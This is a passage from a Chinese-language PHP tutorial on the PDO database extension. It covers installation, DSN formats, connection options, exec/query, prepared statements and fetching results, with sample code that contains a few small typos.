<td>PDO_OCI</td>
<td style="text-align:left">Oracle</td>
</tr>
<tr>
<td>PDO_ODBC</td>
<td style="text-align:left">ODBC v3</td>
</tr>
<tr>
<td>PDO_PGSQL</td>
<td style="text-align:left">PostgreSQL</td>
</tr>
<tr>
<td>PDO_SQLITE</td>
<td style="text-align:left">SQLite 2.x/3.x</td>
</tr>
</tbody>
</table>
<h2><span id="pdo的安装">PDO的安装</span></h2><p>在Linux环境下为启用对MySQL的PDO驱动程序支持，需要在安装PHP5.1以上版本的源代码包环境时，向configure命令添加如下标志：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--with-pdo-mysql=/usr/local/mysql		//其中“/usr/local/mysql”为MySQL服务器安装目录</span><br></pre></td></tr></table></figure></p>
<p>在Windows环境下PHP5.1以上版本中，PDO和主要数据库的驱动同PHP一样作为扩展发布，要激活它们只需要简单地编辑php.ini文件。下面都是用分号在前面注释掉了支持的扩展模块，我们在后面追加下面的一行代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=php_pdo.dll			//所以PDO驱动程序共享的扩展，必须有</span><br></pre></td></tr></table></figure></p>
<p>上面一行是所以PDO驱动程序共享必须要有的扩展。然后，就看使用什么数据库，如果使用MySQL，那么添加下面的一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=php_pdo_mysql.dll				//如果使用MySQL，那么添加这一行</span><br></pre></td></tr></table></figure></p>
<p>如果要激活其他一种数据库的PDO驱动程序，添加下面其中的一行，如果要激活多个数据库的PDO驱动程序，添加下面的多行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extension=php_pdo_mssql.dll			//如果要使用SQL Server，那么添加这一行</span><br><span class="line">extension=php_pdo_odbc.dll			//如果要使用ODBC驱动程序，那么添加这一行</span><br><span class="line">extension=php_pdo_oci.dll			//如果要使用Oracle驱动程序，那么添加这一行</span><br></pre></td></tr></table></figure></p>
<p>保存修改的php.ini文件变化，重启Apache服务器，查看phpinfo()函数PDO是否开启。</p>
<h2><span id="创建pdo对象">创建PDO对象</span></h2><p>使用PDO在与不同数据库管理系统之间交互时，PDO对象中的成员方法是统一各种数据库的访问接口，所以在使用PDO与数据库交互之间，首先要创建一个PDO对象。在通过构造方法创建对象的同时，需要建立一个与数据库服务器的连接，并选择一个数据库。PDO的构造方法原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__construct(string dsn[,string username[,string password[,array driver_options]]])		//PDO的构造方法</span><br></pre></td></tr></table></figure></p>
<p>在构造方法中，第一个必选的参数是数据源名（DSN），用来定义一个确定的数据库和必须用到的驱动程序。DSN的PDO命名惯例为PDO驱动程序的名称，后面一个冒号，再后面是可选的驱动程序的数据库连接变量信息，如主机名、端口和数据库名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oci:dbname=//localhost:1521/mydb			//连接Oracle服务器的数据源名（DSN）</span><br><span class="line">mysql:host=localhost;dbname=testdb			//连接MySQL服务器的数据源名（DSN）</span><br></pre></td></tr></table></figure></p>
<p>构造方法中的第二参数username和第三个参数password分别指定用于连接数据库的用户名和密码，是可选参数。最后一个参数driver_options需要一个数组，用来指定连接所需的所有额外选项，传递附加的调优参数到PDO或底层驱动程序。</p>
<h3><span id="以多种方法调用构造方法">以多种方法调用构造方法</span></h3><h4><span id="将参数嵌入到构造函数">将参数嵌入到构造函数</span></h4><p>在DSN字符串中加载OCI驱动程序并指定了两个可选参数：第一个是数据库名称，第二个是字符集。使用了特定的字符集连接一个特定的数据库，如果不指定任何信息就会使用默认的数据库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	try&#123;</span><br><span class="line">			$dbh = new PDO(&quot;OCI:dbname=accounts;charset=UTF-8&quot;,&quot;scott&quot;,&quot;tiger&quot;);</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">			echo &quot;数据库连接失败：	&quot;.$e-&gt;getMessage();</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>OCI:dbname=accounts告诉PDO它应该使用OCI驱动程序，并且应该使用“accounts”数据库。对于MySQL驱动程序，第一个冒号后面的所有内容都将用做MySQL的DSN。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$dsn=&apos;mysql:dbname=testdb;host=127.0.0.1&apos;;</span><br><span class="line">	$user=&apos;dbuser&apos;;</span><br><span class="line">	$password=&apos;dbpass&apos;;</span><br><span class="line">	try&#123;</span><br><span class="line">			$dbh = new PDO($dsn,$user,$password);</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">			echo &apos;数据库连接失败： &apos;.$e-&gt;getMessage();</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="将参数存放在文件中">将参数存放在文件中</span></h4><p>在创建PDO对象时，可以把DSN字符串放在另一个本地或远程文件中，并在构造函数中引用这个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	try&#123;</span><br><span class="line">		$dbh = new PDO(&apos;uri:file://usr/local/dbconnect&apos;,&apos;webuser&apos;,&apos;password&apos;);</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">		ehco&apos;连接失败： &apos;.$e-&gt;getMessage();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>只要将文件/usr/local/dbconnect中的DSN驱动改变，就可以在多种数据库系统之间切换。但要确保该文件由负责执行PHP脚本的用户拥有，而且此用户拥有必要的权限。</p>
<h4><span id="引用phpini">引用php.ini</span></h4><p>也可以在PHP服务器的配置文件中维护DSN信息，只要在php.ini文件中把DSN信息赋给一个名为pdo.dsn.aliasname的配置参数，这里aliasname是后面将提供给构造函数的DSN别名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[PDO]</span><br><span class="line">pdo.dsn.orcalepdo=&quot;OCI:dbname=//localhost:1521/mydb;charset=UTF-8&quot;;</span><br></pre></td></tr></table></figure></p>
<p>重启启动Apache服务器后，就可以在PHP程序中，调用PDO构造方法时，在第一个参数中使用这个别名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	try&#123;</span><br><span class="line">		$dbh=new PDO(&quot;orcalepdo&quot;,&quot;scott&quot;,&quot;tiger&quot;);	//使用php.ini文件中的oraclepdo别名</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">		echo &quot;数据库连接失败： &quot;.$-&gt;getMessage();</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="pdo与连接有关选项">PDO与连接有关选项</span></h4><p>在创建PDO对象时，有一些与数据库连接有关的选项，可以将必要的几个选项组成数组传递给构造方法的第四个参数driver_opts中，用来传递附加的调优参数到PDO或底层驱动程序。</p>
<table>
<thead>
<tr>
<th>选项名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>PDO::ATTR_AUTOCOMMIT</td>
<td style="text-align:left">确定PDO是否关闭自动提交功能，设置FALSE值时关闭</td>
</tr>
<tr>
<td>PDO::ATTR_CASE</td>
<td style="text-align:left">强制PDO获取的表字符的大小写转换，或原样使用列信息</td>
</tr>
<tr>
<td>PDO::ATTR_ERRMODE</td>
<td style="text-align:left">设置错误处理的模式</td>
</tr>
<tr>
<td>PDO::ATTR_PERSISTENT</td>
<td style="text-align:left">确定连接是否为持久连接，默认值为FALSE</td>
</tr>
<tr>
<td>PDO::ATTR_ORACLE_NULLS</td>
<td style="text-align:left">将返回的空字符串转换为SQL的NULL</td>
</tr>
<tr>
<td>PDO::ATTR_PREFETCH</td>
<td style="text-align:left">设置应用程序提前获取的数据大小，以K字节为单位</td>
</tr>
<tr>
<td>PDO::ATTR_TIMEOUT</td>
<td style="text-align:left">设置超时之前等待的时间</td>
</tr>
<tr>
<td>PDO::ATTR_SERVER_INFO</td>
<td style="text-align:left">包含与数据库特有的服务器信息</td>
</tr>
<tr>
<td>PDO::ATTR_SERVER_VERSION</td>
<td style="text-align:left">包含与数据库服务器版本号有关的信息</td>
</tr>
<tr>
<td>PDO::ATTR_CLIENT_VERSION</td>
<td style="text-align:left">包含与数据库客户端版本号有关的信息</td>
</tr>
<tr>
<td>PDO::ATTR_CONNECTION_STATUS</td>
<td style="text-align:left">包含与数据库特有的与连接状态有关的信息</td>
</tr>
</tbody>
</table>
<h3><span id="pdo对象中的成员方法">PDO对象中的成员方法</span></h3><table>
<thead>
<tr>
<th>成员方法名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>getAttribute()</td>
<td style="text-align:left">获取一个“数据库连接对象”的属性</td>
</tr>
<tr>
<td>setAttribute()</td>
<td style="text-align:left">为一个“数据库连接对象”设定属性</td>
</tr>
<tr>
<td>errorCode()</td>
<td style="text-align:left">获取错误码</td>
</tr>
<tr>
<td>errorInfo()</td>
<td style="text-align:left">获取错误的信息</td>
</tr>
<tr>
<td>exec()</td>
<td style="text-align:left">处理一条SQL语句，并返回所影响的条目数</td>
</tr>
<tr>
<td>query()</td>
<td style="text-align:left">处理一条SQL语句，并返回一个“PDOStatement”对象</td>
</tr>
<tr>
<td>lastInsertId()</td>
<td style="text-align:left">获取插入到表中的最后一条数据的主键值</td>
</tr>
<tr>
<td>prepare()</td>
<td style="text-align:left">负责准备要执行的SQL语句</td>
</tr>
<tr>
<td>getAvailableDrivers()</td>
<td style="text-align:left">获取有效的PDO驱动器名称</td>
</tr>
<tr>
<td>beginTransaction()</td>
<td style="text-align:left">开始一个事务，表明回滚起始点</td>
</tr>
<tr>
<td>commit()</td>
<td style="text-align:left">提交一个事务，并执行SQL</td>
</tr>
<tr>
<td>rollback()</td>
<td style="text-align:left">回滚一个事务</td>
</tr>
</tbody>
</table>
<h2><span id="使用pdo对象">使用PDO对象</span></h2><h3><span id="调整pdo的行为属性">调整PDO的行为属性</span></h3><h4><span id="getattribute">getAttribute()</span></h4><p>该方法只需要提供一个参数，传递一个特定属性名称，执行成功返回该属性所指定的值，否则返回NULL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$opt=array(PDO::ATTR_PERSISTENT =&gt; TRUE);</span><br><span class="line">	try &#123;</span><br><span class="line">   		$dbh = new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;, &apos;mysql_user&apos;, &apos;mysql_pwd&apos;, $opt);</span><br><span class="line">	&#125; catch (PDOException $e) &#123;</span><br><span class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &quot;\nPDO是否关闭自动提交功能：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_AUTOCOMMIT);</span><br><span class="line">	echo &quot;\n当前PDO的错误处理的模式：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_ERRMODE);</span><br><span class="line">	echo &quot;\n表字段字符的大小写转换： &quot;.$dbh-&gt;getAttribute(PDO::ATTR_CASE);</span><br><span class="line">	echo &quot;\n与连接状态相关特有信息： &quot;.$dbh-&gt;getAttribute(PDO::ATTR_CONNECTION_STATUS);</span><br><span class="line">	echo &quot;\n空字符串转换为SQL的null：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_ORACLE_NULLS);</span><br><span class="line">	echo &quot;\n应用程序提前获取数据大小：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_PERSISTENT);</span><br><span class="line">	echo &quot;\n与数据库特有的服务器信息：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_SERVER_INFO);</span><br><span class="line">	echo &quot;\n数据库服务器版本号信息：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_SERVER_VERSION);</span><br><span class="line">	echo &quot;\n数据库客户端版本号信息：&quot;.$dbh-&gt;getAttribute(PDO::ATTR_CLIENT_VERSION);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="setattribute">setAttribute()</span></h4><p>这个方法需要两个参数，第一个参数提供PDO对象特定的属性名，第二个参数则是为这个指定的属性赋一个值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dbh-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);		//设置抛出异常处理错误</span><br></pre></td></tr></table></figure></p>
<h3><span id="使用pdo执行sql语句">使用PDO执行SQL语句</span></h3><h4><span id="使用pdoexec方法">使用PDO::exec()方法</span></h4><p>当执行INSERT、UPDATE和DELETE等没有结果集的查询时，使用PDO对象中的exec()方法去执行。该方法成功执行后，将返回受影响的行数。该方法不能用于SELECT查询。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	try&#123;</span><br><span class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</span><br><span class="line">		exit;	</span><br><span class="line">	&#125;</span><br><span class="line">	$query=&quot;UPDATE contactInfo SET phone=&apos;15801680168&apos; where name=&apos;高某某&apos;&quot;;</span><br><span class="line">	$affected=$dbh-&gt;exec($query);</span><br><span class="line">	if($affected)&#123;</span><br><span class="line">		echo &apos;数据表contactInfo中受影响的行数为：&apos;.$affected;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		print_r($dbh-&gt;errorInfo());</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="使用pdoquery方法">使用PDO::query()方法</span></h4><p>当执行返回结果集的SELECT查询时，或者所影响的行数无关紧要时，应当使用PDO对象中的query()方法。如果该方法成功执行指定的查询，返回一个PDOStatement对象。如果使用了query()方法，并想了解影响的行总数，可以使用PDO对象中的rowCount()方法获取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	try&#123;</span><br><span class="line">	　　$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);　　</span><br><span class="line">	　　$dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	$query=&quot;SELECT name, phone, email FROM contactInfo WHERE departmentId=&apos;D01&apos;&quot;;	</span><br><span class="line">	try &#123;</span><br><span class="line">		$pdostatement=$dbh-&gt;query($query);</span><br><span class="line">　　　　　	echo &quot;一共从表中获取到&quot;.$pdostatement-&gt;rowCount().&quot;条记录:\n&quot;;</span><br><span class="line">		foreach ($pdostatement as $row) &#123;</span><br><span class="line">       		echo $row[&apos;name&apos;] . &quot;\t&quot;;</span><br><span class="line">       		echo $row[&apos;phone&apos;] . &quot;\t&quot;;</span><br><span class="line">        		echo $row[&apos;email&apos;] . &quot;\n&quot;;</span><br><span class="line">    		&#125;</span><br><span class="line">	&#125; catch (PDOException $e) &#123;</span><br><span class="line">		echo $e-&gt;getMessage();</span><br><span class="line"> 		print_r($dbh-&gt;errorInfo());</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2><span id="pdo对预处理语句的支持">PDO对预处理语句的支持</span></h2><h3><span id="了解pdostatement对象">了解PDOStatement对象</span></h3><table>
<thead>
<tr>
<th>方法名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>bindColumn()</td>
<td style="text-align:left">用来匹配列名和一个指定的变量名，这样每次获取各行记录时，会自动将相应的列值赋给该变量</td>
</tr>
<tr>
<td>bindParam()</td>
<td style="text-align:left">将参数绑定到相应的查询占位符上</td>
</tr>
<tr>
<td>bindValue()</td>
<td style="text-align:left">将一值绑定到对应的一个参数中</td>
</tr>
<tr>
<td>closeCursor()</td>
<td style="text-align:left">关闭游标，使该声明再次被执行</td>
</tr>
<tr>
<td>columnCount()</td>
<td style="text-align:left">在结果集中返回列的数目</td>
</tr>
<tr>
<td>errorCode()</td>
<td style="text-align:left">获取错误码</td>
</tr>
<tr>
<td>errorInfo()</td>
<td style="text-align:left">获取错误的信息</td>
</tr>
<tr>
<td>execute()</td>
<td style="text-align:left">负责执行一个准备好的预处理查询</td>
</tr>
<tr>
<td>fetch()</td>
<td style="text-align:left">返回结果集的下一行，当到达结果集末尾时返回FALSE</td>
</tr>
<tr>
<td>fetchAll()</td>
<td style="text-align:left">通过一次调用就可以获取结果集中的所有行，并赋给返回的数组</td>
</tr>
<tr>
<td>fetchColumn()</td>
<td style="text-align:left">返回结果集中下一行某个列的值</td>
</tr>
<tr>
<td>fetchObject()</td>
<td style="text-align:left">获取下一行记录并返回它作为一个对象</td>
</tr>
<tr>
<td>getAttribute()</td>
<td style="text-align:left">获取一个声明属性</td>
</tr>
<tr>
<td>getColumnMeta()</td>
<td style="text-align:left">在结果集中返回某一列的属性信息</td>
</tr>
<tr>
<td>nextRowset()</td>
<td style="text-align:left">检索下一行集（结果集）</td>
</tr>
<tr>
<td>rowCount()</td>
<td style="text-align:left">返回使用query（）方法执行的SELECT语句后受影响的行总数</td>
</tr>
<tr>
<td>setAttribute()</td>
<td style="text-align:left">为一个预处理语句设置属性</td>
</tr>
<tr>
<td>setFetchMode()</td>
<td style="text-align:left">设置需要结果集合的类型</td>
</tr>
</tbody>
</table>
<h3><span id="准备语句">准备语句</span></h3><p>PDO中有两种使用占位符的语法：“命名参数”和“问号参数”。</p>
<ul>
<li><p>使用命名参数作为占位符的INSERT查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dbh-&gt;prepare(&quot;INSERT INTO contactInfo(name,address,phone) VALUES(:name,:address,:phone)&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用问号（？）参数作为占位符的INSERT查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dbh-&gt;prepare(&quot;INSERT INTO contactInfo(name,address,phone) VALUES(?,?,?)&quot;);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="绑定参数">绑定参数</span></h3><p>当查询准备好之后，需要在每次执行时替换输入的参数。可以通过PDOStatement对象中的bindParam()方法，把参数绑定到准备好的查询中相应的占位符。方法bindParame()的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindParam(mixed parameter,mixed&amp;variable[,int data_type[,int length[,mixed driver_options]]])</span><br></pre></td></tr></table></figure></p>
<p>第一个参数parameter是必选项，如果在准备好的查询中，占位符语法使用名字参数时，将名字参数字符串作为bindParam()方法的第一个参数提供。如果占位符语法使用问号参数时，将准备好的查询中列值占位符的索引偏移量，作为该方法的第一个参数提供。<br>第二个参数variable也是必选项，提供赋给第一个参数所指定占位符的值。它需要按引用传递，在结合准备存储过程使用此方时，可以根据存储过程的某个动作修改这个值。因为该参数是按引用传递，所以只能提供变量作为参数，不能直接提供数值。<br>第三个参数data_type是可选项，显示地为当前被绑定的参数设置数据类型。</p>
<ul>
<li>PDO::PARAM_BOOL:代表boolean数据类型</li>
<li>PDO::PARAM_NULL:代表SQL中NULL类型</li>
<li>PDO::PARAM_INT:代表SQL中INTEGER数据类型</li>
<li>PDO::PARAM_STR:代表SQL中CHAR、VARCHAR和其他字符串数据类型</li>
<li>PDO::PARAM_LOB:代表SQL中大对象数据类型</li>
<li>PDO::PARAM_STMT:代表PDOStatement对象类型</li>
<li>PDO::PARAM_INPUT_OUTPUT:专为存储过程使用的数据类型，可以在过程执行后修改</li>
</ul>
<p>第四个参数length是可选项，用于指定数据类型的长度，当在第三个参数中使用PDO_PARAM_INPUT_OUTPUT数据类型时必须使用这个参数。<br>第五个参数driver_options是可选项，通过该参数提供任何数据库驱动程序特定的选项。</p>
<h3><span id="执行准备好的查询">执行准备好的查询</span></h3><p>当准备好查询并绑定了相应的参数，就可以通过调用PDOStatement类对象中的execute（）方法反复执行了。<br>execute()方法中提供了一个可选参数，该参数由准备查询中的命名参数占位符组成的数组，这是第二种为预处理查询在执行中替换输入参数的方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	try&#123;</span><br><span class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$query=&quot;INSERT INTO contactInfo (name, address, phone) VALUES (:name, :address, :phone)&quot;;</span><br><span class="line">	$stmt=$dbh-&gt;prepare($query);</span><br><span class="line"></span><br><span class="line">	$stmt-&gt;execute(array(&quot;:name&quot;=&gt;&quot;赵某某&quot;,&quot;:address&quot;=&gt;&quot;海淀区&quot;, &quot;:phone&quot;=&gt;&quot;15801688348&quot;));</span><br><span class="line"></span><br><span class="line">	$stmt-&gt;execute(array(&quot;:name&quot;=&gt;&quot;孙某某&quot;,&quot;:address&quot;=&gt;&quot;宣武区&quot;, &quot;:phone&quot;=&gt;&quot;15801688698&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="获取数据">获取数据</span></h3><h4><span id="fetch方法">fetch()方法</span></h4><p>DOStatement类中的fetch()方法可以将结果集中当前行的记录以某种方法返回，并将结果集指针移至下一行，当到达结果集末尾时返回FALSE。该方法的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch([int fetch_style[,int cursor_orientation[,int cursor_offset]]])	//返回结果集的下一行</span><br></pre></td></tr></table></figure></p>
<p>第一个参数fetch_style是必选项，获取的一行数据记录中，各列的引用方式取决于这个参数如何设置。可以使用的设置以下六种。</p>
<ul>
<li>PDO::FETCH_ASSOC:从结果集中获取按列名为索引的关联数组</li>
<li>PDO::FETCH_NUM:从结果集中获取一个按列在航中的数值偏移为索引的值数组</li>
<li>PDO::FETCH_BOTH:这是默认值，包含上面两种数组</li>
<li>PDO::FETCH_OBJ：从结果集当前行的记录中获取其属性对应各个列名的一个对象</li>
<li>PDO::FETCH_BOUND:使用fetch()返回TRUE，并将获取的列值赋给通过bindParam()方法中指定的相应变量</li>
<li>PDO::FETCH_LAZY：创建关联数组和索引数组，以及包含列属性的一个对象，从而可以在这三种接口中任选一种</li>
</ul>
<p>第二个参数curosr_orientation是可选项，用来确定当对象是一个可滚动的游标时应当获取哪一行。<br>第三个参数cursor_offset也是可选项，需要提供一个整数值，表示要获取的行相对于当前游标位置的偏移。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	try&#123;</span><br><span class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &apos;&lt;table border=&quot;1&quot; align=&quot;center&quot; width=90%&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;caption&gt;&lt;h1&gt;联系人信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;tr bgcolor=&quot;#cccccc&quot;&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;th&gt;UID&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;联系地址&lt;/th&gt;&lt;th&gt;联系电话&lt;/th&gt;&lt;th&gt;电子邮件&lt;/th&gt;&lt;/tr&gt;&apos;;</span><br><span class="line">	$stmt=$dbh-&gt;query(&quot;select uid,name,address,phone,email from contactInfo&quot;);</span><br><span class="line">	while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;</span><br><span class="line">		echo &apos;&lt;tr&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;uid&quot;].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;name&quot;].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;address&quot;].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;phone&quot;].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;email&quot;].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;/tr&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &apos;&lt;/table&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="fetchall方法">fetchAll()方法</span></h4><p>fetchAll()方法与上一个方法fetch()类似，但是该方法只需要调用一次就可以获取结果集中的所有行，并赋给返回的数组。该方法的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetchAll([int fetch_style[,int column_index]])			//一次调用返回结果集中所有行</span><br></pre></td></tr></table></figure></p>
